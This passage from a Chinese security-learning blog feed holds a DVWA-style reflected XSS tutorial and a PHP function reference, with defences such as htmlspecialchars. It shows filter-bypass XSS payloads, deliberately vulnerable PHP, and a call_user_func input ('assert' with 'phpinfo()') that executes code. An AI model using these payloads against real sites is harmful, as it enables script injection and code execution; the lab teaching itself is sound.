alt="image_1ceaj6a2b9ti1o1ee8s1dh31p5v16.png-148.6kB"></p><p>代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span> <span class="token punctuation">(</span><span class="token string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Is there any input?</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token string">'&lt;script>'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Feedback for end user</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Hello ${name}&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p><em>这里的代码部分也很好理解，比上一章仅仅多了一个过滤，下面来详细讲解一下。</em></p><blockquote><p><code>if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL )</code>这段代码的意思是，如果$_GET中有name这个key并且<code>$_GET[ &#39;name&#39; ]</code>的值不为空的话就执行<code>{}</code>里面的代码。<br><code>$name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</code>这句话的意思是把<code>$_GET[&#39; name &#39;]</code>中的<code>&lt;script&gt;</code>过滤为空( <em>并不安全</em> ),最后一段代码就是输出Hello+name的值在页面上</p></blockquote><h3 id="看懂代码后，如何利用呢"><a href="#看懂代码后，如何利用呢" class="headerlink" title="看懂代码后，如何利用呢?"></a>看懂代码后，如何利用呢?</h3><p><em>我们在上面看代码的时候明白了，在这个<code>Medium</code>等级中，只做了把<code>&lt;script&gt;</code>字符给过滤了，那么我下面就来演示一下如何绕过</em></p><h4 id="先来输入-lt-script-gt-后看看是否为空"><a href="#先来输入-lt-script-gt-后看看是否为空" class="headerlink" title="先来输入&lt;script&gt;后看看是否为空:"></a>先来输入<code>&lt;script&gt;</code>后看看是否为空:</h4><p><img src="http://static.zybuluo.com/1kbfree/q8ojr60jtlbgd9j0au2ouazt/image_1ceajjf5k1tj96go2gr1g67125m1j.png" alt="image_1ceajjf5k1tj96go2gr1g67125m1j.png-86.9kB"><br><em>可以看到这里的输出是为空的，下面来讲绕过</em></p><h4 id="绕过方法1："><a href="#绕过方法1：" class="headerlink" title="绕过方法1："></a>绕过方法1：</h4><p>在输入框中输入<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;iamfree&#39;)&lt;/script&gt;</code>，来看看结果先:</p><p><img src="http://static.zybuluo.com/1kbfree/84iq3szjet2wj8yx7ajecdzh/image_1ceajnhjabo21p1gvvr98fad820.png" alt="image_1ceajnhjabo21p1gvvr98fad820.png-187.2kB"></p><p>解释:<br><img src="http://static.zybuluo.com/1kbfree/kx039acf60sxdjfnf2vo5t8k/image_1ceajudl1146t1oc7g2a6eof402d.png" alt="image_1ceajudl1146t1oc7g2a6eof402d.png-226.2kB"></p><h4 id="绕过方法2"><a href="#绕过方法2" class="headerlink" title="绕过方法2:"></a>绕过方法2:</h4><p>用大写的绕过,输入<code>&lt;SCRIPT&gt;alert(&#39;iamfree&#39;)&lt;/SCRIPT&gt;</code><br><img src="http://static.zybuluo.com/1kbfree/m11mwkcv0os5q4zlmrdu0w06/image_1ceb2ofbv8vt1onl1ksphkse9v9.png" alt="image_1ceb2ofbv8vt1onl1ksphkse9v9.png-99.1kB"></p><h3 id="如何防御-1"><a href="#如何防御-1" class="headerlink" title="如何防御"></a>如何防御</h3><h4 id="防御方法1："><a href="#防御方法1：" class="headerlink" title="防御方法1："></a>防御方法1：</h4><p>其实防御的方法也和上篇一样，但还有一个也很棒的方法哟。<br><img src="http://static.zybuluo.com/1kbfree/gqffm3fwqdt4k6vs7pmzer9u/image_1cealoccsqkbaqe36k11o114j23n.png" alt="image_1cealoccsqkbaqe36k11o114j23n.png-92.4kB"></p><p>代码:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span> <span class="token punctuation">(</span><span class="token string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Is there any input?</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token comment" spellcheck="true">// $name = str_replace( '</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token string">', '</span>xss<span class="token string">', $_GET[ '</span>name' <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span> <span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//把$_GET数组里的值分成$key和$value</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token variable">$key</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$value</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//把$_GET数组中$key对应的$value值html实例化，并且赋值给$name变量</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Feedback for end user</span>    <span class="token variable">$html</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"&lt;pre>Hello ${name}&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><img src="http://static.zybuluo.com/1kbfree/a5wvesn1t9741djg96556kmi/image_1ceall6lr1hh9v331eodlhs1a9t2q.png" alt="image_1ceall6lr1hh9v331eodlhs1a9t2q.png-75.9kB"></p><h4 id="防御方法2："><a href="#防御方法2：" class="headerlink" title="防御方法2："></a>防御方法2：</h4><p><img src="http://static.zybuluo.com/1kbfree/l0deuo57o271iokpaxa2nq9x/image_1ceam2i9s1v1m18m8be116tn1vpn4n.png" alt="image_1ceam2i9s1v1m18m8be116tn1vpn4n.png-93.1kB"></p><p>只需要加上一条<code>preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code>，这也是<code>high</code>的防御方法</p><p><img src="http://static.zybuluo.com/1kbfree/z03p7xg6vp5riplabe5q7ti5/image_1ceam65gk1rn8140916so14nf1rfd54.png" alt="image_1ceam65gk1rn8140916so14nf1rfd54.png-64.4kB"></p><h2 id="htmlspecialchars介绍"><a href="#htmlspecialchars介绍" class="headerlink" title="htmlspecialchars介绍"></a>htmlspecialchars介绍</h2><blockquote><p>htmlspecialchars — 将特殊字符转换为 HTML 实体</p></blockquote><h3 id="执行转换表"><a href="#执行转换表" class="headerlink" title="执行转换表"></a>执行转换表</h3><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:center">替换后</th></tr></thead><tbody><tr><td style="text-align:center">&amp; （和号）</td><td style="text-align:center">成为 <code>&amp;amp;</code></td></tr><tr><td style="text-align:center">“ （双引号）</td><td style="text-align:center">成为 <code>&amp;quot;</code></td></tr><tr><td style="text-align:center">‘ （单引号）</td><td style="text-align:center">成为 <code>&#39;</code></td></tr><tr><td style="text-align:center">&lt; （小于）</td><td style="text-align:center">成为 <code>&amp;lt;</code></td></tr><tr><td style="text-align:center">> （大于）</td><td style="text-align:center">成为 <code>&amp;gt;</code></td></tr></tbody></table><h3 id="未过滤"><a href="#未过滤" class="headerlink" title="未过滤"></a>未过滤</h3><p>先看一段代码简单的代码：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Demo<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token delimiter">&lt;?php</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token delimiter">?></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>你好，<span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>访问<code>http://127.0.0.1/myphp/demo.php?name=1</code>:</p><p><img src="http://static.zybuluo.com/1kbfree/al7qk4pjqlion3hbqsw4ierb/image_1ceefa1be1bbm1rnk1mnt1jn019nc9.png" alt="image_1ceefa1be1bbm1rnk1mnt1jn019nc9.png-86.4kB"></p><p>访问<code>http://127.0.0.1/myphp/demo.php?name=&lt;img src=x&gt;</code>:</p><p><img src="http://static.zybuluo.com/1kbfree/au5kj4jajtjmra5kiy2c0jft/image_1ceefbiqtarl1pcuc268a01lm7m.png" alt="image_1ceefbiqtarl1pcuc268a01lm7m.png-33.9kB"></p><p><em>可见，这个是存在Xss的，那么我们用<code>htmlspecialchars</code>函数来过滤~</em></p><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Demo<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token delimiter">&lt;?php</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter">?></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>你好，<span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>继续访问<code>http://127.0.0.1/myphp/demo.php?name=&lt;img src=x&gt;</code>:</p><p><img src="http://static.zybuluo.com/1kbfree/80yqz9yz6403402w5i9qx44q/image_1ceefgvqvh1ta2riv01papfcb13.png" alt="image_1ceefgvqvh1ta2riv01papfcb13.png-34.8kB"></p><p><em>看到这里，你们就会好奇了，为什么会直接把输入的内容输出出来，而不是以代码被解析？我们打开审查元素看一看(F12)</em></p><p><img src="http://static.zybuluo.com/1kbfree/vk4ukytvdztquz76v0qr25zf/image_1ceefjr3mik51606kc21ete15ct1g.png" alt="image_1ceefjr3mik51606kc21ete15ct1g.png-31.9kB"></p><p><em>我们可以发现这里是把<code>&lt;</code>变成了<code>&amp;lt;</code>,把’&gt;’变成了<code>&amp;gt;</code>，从而导致了代码只会原样输出而不会当成代码来编译</em></p><p>如果你还困惑的，我再给你看一段代码:</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>你好，<span class="token entity" title="&lt;">&amp;lt;</span>img src=x<span class="token entity" title="&gt;">&amp;gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!-- 注意看这里 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>访问<code>http://127.0.0.1/myphp/demo.php</code>:</p><p><img src="http://static.zybuluo.com/1kbfree/eeeo1h0i9gjlamr1ctt17uud/image_1ceefpck81ibnca2re9bvb1tpd1t.png" alt="image_1ceefpck81ibnca2re9bvb1tpd1t.png-74kB"></p>]]></content>
      
      
      
        <tags>
            
            <tag> wd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现状</title>
      <link href="/2018/12/27/xian-zhuang/"/>
      <url>/2018/12/27/xian-zhuang/</url>
      
        <content type="html"><![CDATA[<p><img src="http://static.zybuluo.com/1kbfree/o9lydgu51lavfp479451i0cs/image.png" alt="现状"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 感慨 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP函数统计</title>
      <link href="/2018/12/27/php-han-shu-tong-ji/"/>
      <url>/2018/12/27/php-han-shu-tong-ji/</url>
      
        <content type="html"><![CDATA[<p><img src="http://static.zybuluo.com/1kbfree/pswqhytgfahplm0g9nys439y/image_1cee71otlos41qp4gq6j651r979.png" alt="image_1cee71otlos41qp4gq6j651r979.png-218.7kB"></p><p>不显示错误信息:<code>error_reporting(0)</code></p><p>文件包含函数:<code>include()、include_once()、require()、require_once()</code></p><p>开启session:<code>session_start()</code></p><p>是否开启了gpc功能:<code>if( !get_magic_quotes_gpc() ){}</code></p><p>过滤函数:<code>addslashes()</code>入敏感的内容会被转义(\)</p><hr><p><strong>strtoupper()用法：</strong></p><blockquote><p>将内容转成大写</p></blockquote><hr><p><strong>等号用处分类：</strong></p><pre><code>1、=：赋值，在逻辑运算时也有效；2、==：等于运算，但是不比较值的类型；3、===：完全等于运算，不仅比较值，而且还比较值的类型，只有两者一致才为真。</code></pre><hr><p><strong>strpos()用法：</strong></p><p><img src="http://static.zybuluo.com/1kbfree/v7u0u2vt3mstermy54yh51h8/image_1cml2asu81dbc113tjcv1u641lvv9.png" alt="image_1cml2asu81dbc113tjcv1u641lvv9.png-23.2kB"></p><hr><p><strong>call_user_func()用法：</strong></p><p><img src="http://static.zybuluo.com/1kbfree/kboyep98ziafatwl06orc0ho/image_1cmmfs7ek14eupqrspq1ge9mghp.png" alt="image_1cmmfs7ek14eupqrspq1ge9mghp.png-9.4kB"></p><p>如果我们传递<code>?a=assert&amp;b=phpinfo()</code>就会执行<code>phpinfo</code>函数，如图</p><p><img src="http://static.zybuluo.com/1kbfree/o4n7cdfbnbrhxi992atpl4ik/image_1cmmft0fpri5gt1cs4jaj1uel16.png" alt="image_1cmmft0fpri5gt1cs4jaj1uel16.png-108.3kB"></p><hr><p><strong>readfile()用法：</strong></p><blockquote><p>定义和用法</p></blockquote><p><code>readfile()</code> 函数输出一个文件。<br>该函数读入一个文件并写入到输出缓冲。<br>若成功，则返回从文件中读入的内容与字节数。若失败，则返回 false。您可以通过 <code>@readfile()</code> 形式调用该函数，来隐藏错误信息。</p><p><code>readfile( filename,include_path,context )</code></p><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">filename</td><td style="text-align:center">必需。规定要读取的文件。</td></tr><tr><td style="text-align:center">include_path</td><td style="text-align:center">可选。如果也想在include_path中搜索文件，可以使用该参数并将其设为 true。</td></tr><tr><td style="text-align:center">context</td><td style="text-align:center">可选。规定文件句柄的环境。Context 是可以修改流的行为的一套选项。</td></tr></tbody></table><pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span> <span class="token string">'cai_team.txt'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="http://static.zybuluo.com/1kbfree/v6c48k8uhhan8wid021wdjdv/image_1cf5k429h93b1t2dls83t6db919.png" alt="image_1cf5k429h93b1t2dls83t6db919.png-42.2kB"></p><hr><p><strong>define用法:</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"GREETING"</span><span class="token punctuation">,</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span> <span class="token function">defined</span><span class="token punctuation">(</span><span class="token string">"GREETING"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//如果存在返回True</span><span class="token function">var_dump</span><span class="token punctuation">(</span> <span class="token function">defined</span><span class="token punctuation">(</span><span class="token string">"only_free"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>输出：</p><p><img src="http://static.zybuluo.com/1kbfree/h6f8bb30aqob5krl7kutm4l5/image_1cjgnhepi1qip65erps107v134p9.png" alt="image_1cjgnhepi1qip65erps107v134p9.png-44.4kB"></p><hr><p><strong>chdir用法:</strong></p><p><img src="http://static.zybuluo.com/1kbfree/z9hjzdocsf3qe8tbas1qc0hf/image_1cdp74hqt1rgd9ln1rgv736man9.png" alt="image_1cdp74hqt1rgd9ln1rgv736man9.png-28.3kB"></p><hr><p><strong>mkdir用法:</strong></p><pre><code>&lt;?php    mkdir(&#39;1.iamfree&#39;) //会在当前目录下创建一个1.iamfree文件夹?&gt;</code></pre><hr><p><strong>const用法：</strong></p><pre><code>&lt;?php    const name=&#39;iamfree&#39;;    echo name;/*输出:iamfree*/?&gt;</code></pre><hr><p><strong>htmlspecialchars()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/q8yrwithqaykeziaxj3w50aq/image_1cavlibuatcrb7u1qbv6ni1p9.png" alt="image_1cavlibuatcrb7u1qbv6ni1p9.png-17.3kB"></p><h3 id="执行转换"><a href="#执行转换" class="headerlink" title="执行转换:"></a>执行转换:</h3><table><thead><tr><th style="text-align:left">字符</th><th style="text-align:left">替换后</th></tr></thead><tbody><tr><td style="text-align:left">&amp; (&amp; 符号)</td><td style="text-align:left"><code>&amp;amp;</code></td></tr><tr><td style="text-align:left">“ (双引号)</td><td style="text-align:left"><code>&amp;quot;</code>，除非设置了 ENT_NOQUOTES</td></tr><tr><td style="text-align:left">‘ (单引号)</td><td style="text-align:left">设置了 ENT_QUOTES 后， &#039; (如果是 ENT_HTML401) ，或者 &apos; (如果是 ENT_XML1、ENT_XHTML 或 ENT_HTML5)。</td></tr><tr><td style="text-align:left">&lt; (小于)</td><td style="text-align:left"><code>&amp;lt</code></td></tr><tr><td style="text-align:left">> (大于)</td><td style="text-align:left"><code>&amp;gt</code></td></tr></tbody></table><hr><p><strong>extract()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/bbsz4gdm60bwu3xpa3bb09k2/image_1cb2cblp6lpb19ku1ouu4d81h701t.png" alt="image_1cb2cblp6lpb19ku1ouu4d81h701t.png-32.2kB"></p><hr><p><strong>parse_str()：</strong></p><pre><code> &lt;?php    parse_str(&#39;name=iamfree&#39;); //把name变成变量名，iamfree变成变量值    echo $name;//输出iamfree?&gt;</code></pre><hr><p><strong>import_request_variables():</strong></p><p><em>此函数把GET、POST、COOKIE的参数注册为变量，一般不建议开启</em></p><blockquote><p>注意,只在 <code>PHP4.1</code>到<code>PHP5.4</code>之间可用</p></blockquote><pre><code>&lt;?php    $name = &#39;whoami&#39;;    import_request_variables(&#39;GP&#39;); //G表示GET、P表示POST如果有C表示COOKIE；这里的GP表示注册GET和POST请求的参数为变量    echo $name;?&gt;</code></pre><p><strong>效果：</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://static.zybuluo.com/1kbfree/n09o5bhlvrv1my1f2zqxgf4q/image_1cckvkb6b186c6g11p8ojf4lbd9.png" alt="image_1cckvkb6b186c6g11p8ojf4lbd9.png-54.1kB"></h2><p><strong>array_key_exists()：</strong></p><pre><code>array_key_exists ( $key , $array )</code></pre><blockquote><p>数组里有键 key 时，array_key_exists() 返回 TRUE。 key 可以是任何能作为数组索引的值。</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/wkcc7p351cowwqz1k9hjbwy3/image_1cba1lh3okkkg0n1qkp1uuc104v9.png" alt="image_1cba1lh3okkkg0n1qkp1uuc104v9.png-16.1kB"></p><hr><p><strong>str_ireplace过滤sql语句：</strong><br><img src="http://static.zybuluo.com/1kbfree/hmfq9fei2t8khzcusyszh8i3/str_ireplace.png" alt="str_ireplace.png-816.7kB"><br><strong>此函数用法：</strong><br><img src="http://static.zybuluo.com/1kbfree/7yuotvm35lw7w6zzdr1q414y/str_ireplace%E7%94%A8%E6%B3%95.png" alt="str_ireplace用法.png-6.4kB"><br><em>将 whoami? 中的 whoami 被 iamfree 替换，也就是说把whoami?里的whoami替换成iamfree所以结果就是iamfree?</em></p><p><strong>这里其实是可以绕过的，比如：</strong><br><img src="http://static.zybuluo.com/1kbfree/1vaj8guxs3swd43zh3uvkqbb/image_1caugtd8fj54ke9tf112cr1qbl4h.png" alt="image_1caugtd8fj54ke9tf112cr1qbl4h.png-150.2kB"></p><hr><p>运算符:<br>名称  |  关系 |    示例     |        结果<br>:-:|:-:|:-:<br>and  |  与 |      <code>$x and $y</code>    |如果 <code>$x</code> 和 <code>$y</code> 都为 true，则返回 true。    |<br>or  |     或     | <code>$x or $y</code>   |    如果 <code>$x</code> 和 <code>$y</code> 至少有一个为 true，则返回 true。<br>xor |    异或  |  <code>$x</code> xor <code>$y</code>  |   如果 <code>$x</code> 和 <code>$y</code> 有且仅有一个为 true，则返回 true。<br>&amp;&amp;  |  与    |    <code>$x</code> &amp;&amp; <code>$y</code>   | 如果 <code>$x</code> 和 <code>$y</code> 都为 true，则返回 true。<br>||    |    或  |      <code>$x</code> ||<code>$y</code> |       如果 <code>$x</code> 和 <code>$y</code> 至少有一个为 true，则返回 true。<br>! |    非    |     <code>!$x</code>|              如果 $x 不为 true，则返回 true。</p><hr><p><strong>变量覆盖:</strong><br><img src="http://static.zybuluo.com/1kbfree/p5uq0jbmj08gy7607w66rm51/image_1cbrhvola1igmjhm15mc1rsqed816.png" alt="image_1cbrhvola1igmjhm15mc1rsqed816.png-33.4kB"><br><img src="http://static.zybuluo.com/1kbfree/wfifd51c43j7d5zdxsg08bd1/image_1cbri0lsa1tuc1erh1d5q1drsdre1j.png" alt="image_1cbri0lsa1tuc1erh1d5q1drsdre1j.png-70.7kB"></p><p><strong>难一点的：</strong></p><pre><code>&lt;?php     foreach (array( &#39;_GET&#39;,&#39;_POST&#39; ) as $key =&gt; $value) {        foreach ($$value as $_key =&gt; $_value){            echo $_key.&#39;:&#39;.$_value;            echo &quot;&lt;br &gt;&quot;;        }    }?&gt;</code></pre><p><strong>执行后的结果：</strong><br><img src="http://static.zybuluo.com/1kbfree/n7f97a459waufv27gbwrmsv0/image_1ccl9ivq22vk1pdat631f7oq8s1g.png" alt="image_1ccl9ivq22vk1pdat631f7oq8s1g.png-32.5kB"></p><hr><p><strong>define()用法:</strong></p><pre><code>&lt;?php     define(&#39;t&#39;,time()); //把time()的返回值定义为常量(t)        echo t;?&gt;</code></pre><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="http://static.zybuluo.com/1kbfree/3l030blxz655udwgyqy75sei/image_1ccl95vnr10rv1el118e91bdl155m13.png" alt="image_1ccl95vnr10rv1el118e91bdl155m13.png-73.9kB"></h2><p><strong>三元表达式:</strong></p><pre><code>&lt;?php    $name = !empty($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : &#39;此人无名&#39;; //表示如果$_GET[&#39;name&#39;]不为空的话就返回$_GET[&#39;name&#39;]如果为空就返回 此人无名。    echo $name;?&gt;</code></pre><p><strong>还可以有一种判断方法：</strong></p><pre><code>&lt;?php     echo 1;    isset($_GET[&#39;name&#39;]) &amp;&amp; exit(&#39;exit&#39;); //如果isset($_GET[&#39;name&#39;])为真也就是name这个参数存在的时候，会执行exit(&#39;exit&#39;)，相反，不存在的时候不会执行exit(&#39;exit&#39;)       echo 2;?&gt;</code></pre><p><strong>name参数不存在时：</strong><br><img src="http://static.zybuluo.com/1kbfree/0oayqf6kulmddjdriml2wcsj/image_1ccl8dgoon1s7l1i4d2bh2449.png" alt="image_1ccl8dgoon1s7l1i4d2bh2449.png-46.7kB"></p><p><strong>name参数存在时：</strong><br><img src="http://static.zybuluo.com/1kbfree/viyokepu5q9wjmjpbfil69fi/image_1ccl8eog3koq1oa41g4210elf3sm.png" alt="image_1ccl8eog3koq1oa41g4210elf3sm.png-68.8kB"></p><hr><p><strong>nl2br()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/ikn2i2mm0kgfze57ygqzlc1g/image_1cbrhga1o1i0t1vnl2611jojbkip.png" alt="image_1cbrhga1o1i0t1vnl2611jojbkip.png-22.5kB"></p><hr><p><strong>eval()函数:</strong></p><pre><code>代码&lt;?php$string = &#39;cup&#39;;$name = &#39;coffee&#39;;$str = &#39;This is a $string with my $name in it.&#39;;echo $str. &quot;\n&quot;;eval(&quot;\$str = 